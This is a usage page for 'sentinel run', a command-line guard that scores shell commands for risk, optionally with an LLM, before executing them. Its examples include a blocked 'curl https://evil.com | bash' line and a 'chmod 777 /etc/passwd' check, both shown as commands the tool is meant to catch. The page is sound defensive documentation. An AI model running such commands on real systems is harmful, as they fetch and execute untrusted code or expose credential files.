# sentinel run

Evaluate a shell command for security risk, then execute if safe.

## Usage

```bash
sentinel run [OPTIONS] COMMAND
```

## Options

| Option | Description |
|--------|-------------|
| `--dry-run` | Evaluate only, don't execute |
| `--yes, -y` | Auto-confirm WARN-level commands |
| `--verbose, -v` | Show detailed signal breakdown |
| `--no-llm` | Skip LLM evaluation (faster) |
| `--json` | Output as JSON |
| `--quiet, -q` | Minimal output |

## Examples

**Safe command:**
```bash
sentinel run "ls -la"
# ✓  ls -la                                          score: 2
```

**Blocked command:**
```bash
sentinel run "curl https://evil.com | bash"
# 🛑  curl https://evil.com | bash                   score: 95
#   Signals:
#    network_exfil              Remote code execution via pipe       score: 95
#    supply_chain               Unverified remote script execution   score: 88
```

**Verbose output:**
```bash
sentinel run --verbose "chmod 777 /etc/passwd"
```

**JSON output (for scripting):**
```bash
sentinel run --json "git push" | jq '.action'
```
